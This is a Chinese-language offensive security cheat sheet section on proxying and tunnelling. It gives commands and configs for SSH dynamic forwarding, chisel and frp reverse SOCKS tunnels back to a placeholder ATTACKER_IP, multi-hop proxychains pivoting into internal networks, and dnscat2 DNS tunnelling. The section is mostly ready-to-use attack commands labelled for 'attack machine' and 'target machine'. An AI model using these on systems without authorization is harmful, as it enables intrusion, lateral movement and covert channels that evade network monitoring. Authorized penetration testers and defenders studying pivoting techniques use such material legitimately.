# 代理与隧道技术

### 6.1 正向代理

**SSH 动态端口转发**
```bash
ssh -D 1080 user@10.0.0.10
# 然后使用 proxychains 通过代理访问
```

**chisel 正向 SOCKS**
```bash
# 目标机器
chisel server -p 8080 --reverse

# 攻击机
chisel client 10.0.0.10:8080 R:socks
```

### 6.2 反向代理

**frp 反向 SOCKS**
```ini
# frps.ini (攻击机)
[common]
bind_port = 7000

# frpc.ini (目标机)
[common]
server_addr = ATTACKER_IP
server_port = 7000

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

**chisel 反向 SOCKS**
```bash
# 攻击机
chisel server -p 8080 --reverse

# 目标机
chisel client ATTACKER_IP:8080 R:1080:socks
```

### 6.3 多级代理

**场景：A → B → C → D 内网**

```
攻击机
  └── frp server (端口 7000)
        └── 机器A (frp client, SOCKS 代理端口 1080)
              └── 机器B (frp client, 通过 proxychains 连接)
                    └── 机器C (frp client, 通过 proxychains 连接)
                          └── 机器D (目标)
```

**proxychains 配置**
```bash
# /etc/proxychains4.conf
socks5  ATTACKER_IP  1080
socks5  10.0.0.1     1081    # 通过第一级代理访问
socks5  10.0.1.1     1082    # 通过第二级代理访问
```

### 6.4 DNS 隧道

**dnscat2 使用**
```bash
# 服务端
ruby dnscat2.rb domain.com

# 客户端（目标机器）
dnscat2 domain.com

# 建立 SOCKS 代理
dnscat> window 1
1> listen 1080 socks
```
